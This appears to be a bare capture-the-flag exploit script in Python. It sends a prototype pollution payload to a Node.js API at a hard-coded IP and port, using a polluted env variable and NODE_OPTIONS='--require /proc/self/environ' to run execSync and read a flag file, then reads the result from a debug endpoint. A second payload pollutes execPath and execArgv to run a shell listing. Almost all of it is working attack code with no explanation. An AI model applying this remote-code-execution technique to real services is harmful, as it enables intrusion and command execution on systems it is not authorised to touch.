import requests

url = "http://138.68.155.238:30428/api/calculate"
url1 = "http://138.68.155.238:30428/debug/version"
headers = {"Cotent-Type":"application/json"}
payload = '''{"name":"Cat","constructor":{"prototype":{"env":{ "EVIL":"console.log(require('child_process').execSync('cat flag_e1T6f').toString())//"},"NODE_OPTIONS":"--require /proc/self/environ"}}}'''

requests.post(url,data=payload,headers=headers)

x = requests.get(url1)
print(x.text)


{"constructor" :{"prototype": {"execPath": "ls", "execArgv": ["-la", "."]}}}